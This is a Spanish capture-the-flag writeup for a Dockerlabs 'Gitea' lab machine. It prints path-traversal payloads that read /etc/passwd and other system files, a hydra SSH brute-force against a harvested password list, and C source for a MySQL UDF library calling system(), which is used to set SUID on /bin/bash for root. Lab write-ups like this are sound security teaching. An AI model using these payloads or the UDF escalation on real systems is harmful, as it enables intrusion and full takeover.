
# Writeup Template: Maquina `[ Gite ]`

- Tags: #Gitea #UDFUser-DefinedFunctions #MysqlUDFU
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Gitea](https://mega.nz/file/SEcgiQIC#UvyzMp11ssDZxnODZXbboOKjJZ3y73TVsMf6kJflEtg)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x gitea.zip
sudo bash auto_deploy.sh
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV nmap -sCV -p22,80,3000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((UbuntuNoble))
3000/tcp open  http    Golang net/http server
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/
```

De igual manera tenemos **hostsDiscovery** asi que agregamos la siguiente linea a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 admin.s3cr3tdir.dev.gitea.dl
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://admin.s3cr3tdir.dev.gitea.dl/
```

Reporte:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/ [200 OK] Apache[2.4.58], Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[_csrf,i_like_gitea], IP[172.17.0.2], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 http://admin.s3cr3tdir.dev.gitea.dl/
```

Reporte:
```bash
/admin/: Possible admin folder
/Admin/: Possible admin folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://admin.s3cr3tdir.dev.gitea.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/issues/              (Status: 303) [Size: 38] [--> /user/login]
/admin/               (Status: 200) [Size: 19849]
/explore/             (Status: 303) [Size: 41] [--> /explore/repos]
/designer/            (Status: 200) [Size: 27638]
/milestones/          (Status: 303) [Size: 38] [--> /user/login]
/notifications/       (Status: 303) [Size: 38] [--> /user/login]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 13615]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/LICENSE              (Status: 200) [Size: 35149]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.admin.s3cr3tdir.dev.gitea.dl" -u 172.17.0.2 --hl=10,315
```

- **Hallazgos**:
	No reporta subdominios
### Credenciales Encontradas
Desde el panel la pagina nos deja ver dos usuarios:
```bash
designer
admin
```

Ahora estando aqui en los repositorios tenemos los proyectos:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer
```

En esta ruta tenemos el codigo fuente de la **app**:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/src/branch/main/app.py
```

El codigo es este:
```python
from flask import Flask, request, render_template, send_file, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if "file" not in request.files:
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file = request.files["file"]

        if file.filename == "":
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(file_path)
        flash(f'Archivo "{file.filename}" subido correctamente.', "success")

    files = os.listdir(UPLOAD_FOLDER)
    return render_template("index.html", files=files)


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)

    flash("Archivo no encontrado", "danger")
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True)
```

Estamos viendo que intenta cargar un archivo bajo el parametro **filename** en una carpeta **download** al que probaremos si existe:
Cuando lo intentamo cargar vemos que existe pero no nos deja entrar ya que necesitamos las credenciales:
```bash
http://gitea.dl/download
```

Asi que como sabemos el parametro al que apunta nos aprovechamos de esto para verificar si es vulnerable de la siguiente manera:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://gitea.dl/download?filename=FUZZ" --hl=5,0 
```

Tenemos estas posivildidades de enumerar los archivos internos del sistema:
```bash
000000016:   200        26 L     34 W       1307 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
000000020:   200        26 L     34 W       1307 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"               
000000023:   200        26 L     34 W       1307 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                            
000000135:   200        1 L      6 W        37 Ch       "/etc/fstab"                                                                        
000000138:   200        47 L     47 W       603 Ch      "/etc/group"                                                                        
000000206:   200        8 L      21 W       262 Ch      "../../../../../../../../../../../../etc/hosts"                                     
000000205:   200        8 L      21 W       262 Ch      "/etc/hosts"                                                                        
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                  
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                   
000000121:   200        225 L    1107 W     7178 Ch     "/etc/apache2/apache2.conf"                                                         
000000129:   200        4 L      36 W       270 Ch      "/etc/apt/sources.list"                                                             
000000261:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"               
000000248:   200        29 L     174 W      1126 Ch     "/etc/mysql/my.cnf"                                                                 
000000262:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                  
000000263:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                     
000000254:   200        26 L     34 W       1307 Ch     "/../../../../../../../../../../etc/passwd"                                         
000000257:   200        26 L     34 W       1307 Ch     "/etc/passwd"                                                                       
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                    
000000250:   200        20 L     65 W       526 Ch      "/etc/nsswitch.conf"                                                                
000000258:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"      
000000259:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"         
000000260:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"            
000000253:   200        26 L     34 W       1307 Ch     "/./././././././././././etc/passwd"                                                 
000000237:   200        2 L      5 W        26 Ch       "/etc/issue"                                                                        
000000236:   200        353 L    1042 W     8139 Ch     "/etc/init.d/apache2"                                                               
000000311:   200        26 L     34 W       1307 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                        
000000264:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                        
000000270:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../etc/passwd"                                          
000000266:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../etc/passwd"                              
000000268:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../etc/passwd"                                    
000000271:   200        26 L     34 W       1307 Ch     "../../../../../../../../../etc/passwd"                                             
000000265:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../../../etc/passwd"                           
000000269:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../etc/passwd"                                       
000000272:   200        26 L     34 W       1307 Ch     "../../../../../../../../etc/passwd"                                                
000000273:   200        26 L     34 W       1307 Ch     "../../../../../../../etc/passwd"                                                   
000000274:   200        26 L     34 W       1307 Ch     "../../../../../../etc/passwd"                                                      
000000275:   200        26 L     34 W       1307 Ch     "../../../../../etc/passwd"                                                         
000000267:   200        26 L     34 W       1307 Ch     "../../../../../../../../../../../../../etc/passwd"                                 
000000399:   200        8 L      36 W       223 Ch      "/etc/resolv.conf"                                                                  
000000400:   200        41 L     120 W      911 Ch      "/etc/rpc"                                                                          
000000422:   200        122 L    387 W      3255 Ch     "/etc/ssh/sshd_config"                                                              
000000929:   200        26 L     34 W       1307 Ch     "///////../../../etc/passwd"                                                        
```

Con este no nos muestra nada pero si realizamos la peticion desde la terminal con **curl**
```bash
curl -s -X GET "http://gitea.dl/download?filename=/etc/passwd"
```

Logrando ver el archivo:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
designer:x:1001:1001::/home/designer:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:103:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
```

Ahora tenemos esta url con el codigo **XML** 
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/giteaInfo/src/branch/main/gitea_composed.xml
```

Tenemos la siguiente informacion:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<gitea>
    <service>
        <name>gitea</name>
        <image>gitea/gitea:latest</image>
        <ports>
            <port>3000:3000</port>
            <port>222:22</port>
        </ports>
        <volumes>
            <volume>/home/designer/gitea:/data</volume>
            <volume>/home/designer/gitea:/data/info.txt</volume>
            <volume>/opt/"INFO_FILE"</volume>
        </volumes>
        <environment>
            <variable name="GITEA__database__DB_TYPE">sqlite3</variable>
            <variable name="GITEA__database__PATH">/data/gitea.db</variable>
        </environment>
        <restart>always</restart>
    </service>
</gitea>
```

Tenemos esta ruta que intentaremos apuntar con nuestro **LFI**
```bash
<volume>/home/designer/gitea:/data</volume>
<volume>/home/designer/gitea:/data/info.txt</volume>
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos informacion de dos rutas potencilaes intentaremos apuntar a ellas:

### Ejecucion del Ataque
Con esta no obtuvimos nada:
```bash
curl -s -X GET "http://gitea.dl/download?filename=....//....//....//....//home/designer/gitea:/data/info.txt"
```

```bash
# Comandos para explotación
curl -s -X GET "http://gitea.dl/download?filename=../../../../../opt/info.txt"
```

Ahora tenemos informacion:
```bash
user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
user011:RootMePls$5 - Daniel dejó su servidor expuesto y no tardó en notar actividad sospechosa.
user012:SuperSecure*78 - Alejandra se enorgullecía de su conocimiento en seguridad, pero un descuido le costó caro.
user013:HelloWorld#91 - A Roberto le gustaba la programación y decidió usar un clásico como su clave.
user014:LetMeInNow!! - Diego estaba cansado de recordar claves complejas y optó por algo simple.
user015:TrickyPass66 - Una red social filtró su contraseña y pronto la vio expuesta en la web.
user016:UnsafeButFun$$ - Joaquín se divertía rompiendo su propia seguridad, pero un día fue víctima de su propio juego.
user017:HackThis!@3 - Beatriz creó su contraseña en modo irónico, pero los atacantes no lo tomaron como broma.
user018:SuperSecurePassword123 - Los hackers más novatos pensaban que usar lenguaje leet era seguro. No lo era.
user019:JustAnotherKey99 - Nadie pensaría en usar una clave tan genérica... excepto miles de personas.
user020:TryGuessMe#22 - Un pentester descubrió la clave en segundos y le envió un mensaje a su dueño.
user021:SimplePass88! - Isabel nunca imaginó que alguien intentaría adivinar su contraseña.
user022:HiddenSecret!2 - Aún después de cambiar su clave, Luis no podía quitarse la sensación de inseguridad.
user023:CrazyCodePass@ - Un desarrollador decidió probar una contraseña al azar... y olvidarla al día siguiente.
user024:SneakyKey99$ - Los ataques de diccionario estaban de moda, y Pablo decidió cambiar su clave.
user025:Password@Vault - Un gestor de contraseñas podría haber ayudado a Ricardo, pero prefirió confiar en su memoria.
user026:EliteHacker#77 - Creer que una contraseña es segura solo por tener símbolos es un error común.
user027:FortKnoxPass!! - Ignacio aprendió por las malas que no existe una seguridad infalible.
user028:IronWall!99 - La clave era sólida, pero un descuido con su correo llevó a una filtración.
user029:UltraHidden#32 - A pesar del nombre, la contraseña de Javier no era tan oculta.
user030:GodModeActive! - Mariana sintió que tenía el control, hasta que recibió una alerta de acceso sospechoso.
user031:MasterKey$66 - Un viejo truco de seguridad le falló a Fernando en el peor momento.
user032:NoOneCanSeeMe! - La privacidad era esencial para Esteban, pero alguien siempre estaba mirando.
user033:LockedSafe#12 - Una contraseña compleja no sirve si la guardas en un documento sin cifrar.
user034:MyLittleSecret@ - El diario de Valeria contenía muchos secretos, incluida su clave más preciada.
user035:BigBossKey!! - Alfonso era el administrador del sistema, pero un error le costó el acceso.
user036:DigitalFortress$ - Inspirado en su novela favorita, Tomás creó una clave única... o eso creía.
user037:PasswordBank#9 - Usar la misma clave para todo fue la peor decisión de Gabriel.
user038:YouShallNotPass! - El homenaje a Gandalf no protegió a Enrique de un ataque automatizado.
user039:NotSoObvious99 - Era una contraseña "no tan obvia", hasta que apareció en una filtración.
user040:SecretStash@12 - Emilia guardaba sus contraseñas en un archivo llamado "Seguridad.txt". Mala idea.
user041:AnonymousPass$ - Creyó que su clave era anónima, pero los registros contaban otra historia.
user042:BlackHatKey!77 - Aprender hacking ético le ayudó a darse cuenta de sus propias vulnerabilidades.
user043:RedTeamAccess# - Un pentest interno reveló que la seguridad de la empresa era más frágil de lo que pensaban.
user044:PrivilegedUser@ - Tener privilegios de administrador no te hace inmune a ataques.
user045:HiddenVault$$ - Un sistema de almacenamiento cifrado no sirve si la clave es demasiado simple.
user046:EncryptionKing! - Amante del cifrado, Samuel pensó que su clave era invulnerable. No lo era.
user047:DecryptedEasy# - Un día descubrió que su clave había sido descifrada con facilidad.
user048:BypassMePlz!! - Quiso jugar con la seguridad y terminó perdiendo el acceso.
user049:SuperHiddenKey@ - Creyó que su contraseña nunca sería descubierta... hasta que lo fue.
user050:CyberGuardian99! - La ciberseguridad no es solo cuestión de contraseñas fuertes, sino de hábitos seguros.
```

Todo esto lo guardamos en un archivo: para realizar la siguiente expresion regular para obtener todas las passwords:
```bash
sed -E 's/^user[0-9]+:([^ ]+) -.*$/\1/' password.txt

Passw0rd!23
Qwerty@567
Secure#Pass1
H4ckM3Plz!
Random*Key9
UltraSafe99$
TopSecret!!
MyP@ssw0rd22
S3cur3MePls#
Admin123!
RootMePls$5
SuperSecure*78
HelloWorld#91
LetMeInNow!!
TrickyPass66
UnsafeButFun$$
HackThis!@3
SuperSecurePassword123
JustAnotherKey99
TryGuessMe#22
SimplePass88!
HiddenSecret!2
CrazyCodePass@
SneakyKey99$
Password@Vault
EliteHacker#77
FortKnoxPass!!
IronWall!99
UltraHidden#32
GodModeActive!
MasterKey$66
NoOneCanSeeMe!
LockedSafe#12
MyLittleSecret@
BigBossKey!!
DigitalFortress$
PasswordBank#9
YouShallNotPass!
NotSoObvious99
SecretStash@12
AnonymousPass$
BlackHatKey!77
RedTeamAccess#
PrivilegedUser@
HiddenVault$$
EncryptionKing!
DecryptedEasy#
BypassMePlz!!
SuperHiddenKey@
CyberGuardian99!
```

Sabiendo que tenemos un usuario valido para el sistema:
```bash
designer:x:1001:1001::/home/designer:/bin/bash
```

Ahora todas esas contrasenas las guardamos en un archivo **passwords.txt** para aplicar fuerza bruta con hydra:
```bash
hydra -l designer -P passwords.txt -f ssh://172.17.0.2
```

Tenemos la contrasena valida para este usuario:
```bash
[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
```
### Intrusion
Ahora iniciaremos sesion con este usuario:
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh designer@172.17.0.2 # ( SuperSecurePassword123 )
```

---
## Escalada de Privilegios
Para la escalada usaremos la documentacion del usuario: [dise0](https://dise0.gitbook.io/h4cker_b00k/ctf/ctfs/ctf-gitea-intermediate)
###### Usuario `[ designer ]`:
Listamos los puertos en escucha de la maquina victima:
```bash
ss -tuln

Netid                       State                        Recv-Q                       Send-Q                                             Local Address:Port                                             Peer Address:Port                       Process
tcp                         LISTEN                       0                            80                                                     127.0.0.1:3306                                                  0.0.0.0:*
tcp                         LISTEN                       0                            128                                                      0.0.0.0:22                                                    0.0.0.0:*
tcp                         LISTEN                       0                            511                                                      0.0.0.0:80                                                    0.0.0.0:*
tcp                         LISTEN                       0                            128                                                         [::]:22                                                       [::]:*
tcp                         LISTEN                       0                            4096                                                           *:3000                                                        *:*
```

Ahora sabiendo que el servicio de **mysql** esta habilitado procedemos a logueranos en la base de datos:
```bash
mysql -u admin -pPassAdmin123-
```

### Vulnerabilidad UDF (User-Defined Functions) en MySQL

Las **Funciones Definidas por el Usuario (UDF)** en MySQL permiten extender la funcionalidad del servidor mediante bibliotecas externas. Sin embargo, presentan graves riesgos de seguridad si no se configuran adecuadamente.
Ahora para explotar esta vulnerabilidad seguiremos la documentacion, Tenemos **gcc** para compilar, asi que en el directorio **tmp** crearemos el siguiente archivo:
**lib_mysqludf_sys.c**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql/mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() takes exactly one string argument.");
        return 1;
    }
    return 0;
}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->args[0]) {
        return system(args->args[0]);
    }
    return -1;
}

my_bool sys_exec_deinit(UDF_INIT *initid) {
    return 0;
}
```

Ahora lo compilamos:
```bash
gcc -shared -o lib_mysqludf_sys.so -fPIC lib_mysqludf_sys.c -I/usr/include/mysql/ -L/usr/lib/ -lmariadbclient
```

Despues lo movemos a los archivos de **mysql**
```bash
mv /tmp/lib_mysqludf_sys.so /usr/lib/mysql/plugin/
```

Revisando los permisos tenemos capacidad de escritura:
```bash
ls -la /usr/lib/mysql/

drwxr-xrwx 1 root root 4096 Feb 27 13:33 plugin
```

Ahora nos volvemos a conectar para cargar la funcion:
```bash
mysql -u admin -pPassAdmin123-
```

Listamos las bases de datos existentes:
```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
```

Nos cambiamos de base de datos:
```bash
MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> 
```

Ahora cargamos la funcion:
```bash
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```

Vemos que se cargo correctamente:
```bash
Database changed
MariaDB [mysql]> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
Query OK, 0 rows affected (0.010 sec)
```

Ahora podemos usar esa funcion para ejecutar comandos:
```bash
SELECT sys_exec('chmod u+s /bin/bash');
```

```bash
MariaDB [mysql]> SELECT sys_exec('chmod u+s /bin/bash');
+---------------------------------+
| sys_exec('chmod u+s /bin/bash') |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row in set (0.003 sec)
```

Listamos los permisos de la bash:
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Tenemos **SUID** Ahora podemos ejecutar una **bash** con privilegios de **root**
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---
## Evidencia de Compromiso
Flags **root**
```bash
bash-5.2# ls -la /root

-rw-r--r--  1 root root   33 Feb 26 12:27 root.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a leer archivos internos de la maquina atraves de un **LFI**
2. Aprendimos a obtener credenciales de acceso de archivos internos gracias a un **LFI**
3. Aprendimos a hacer fuerza bruta con **hydra** para ganar acceso por **ssh**
4. Aprendimos a abusar de **mysq** para ganar acceso como **root**

## Recomendaciones de Seguridad
- Evitar capacidad de escritura sobre el archivo **mysql**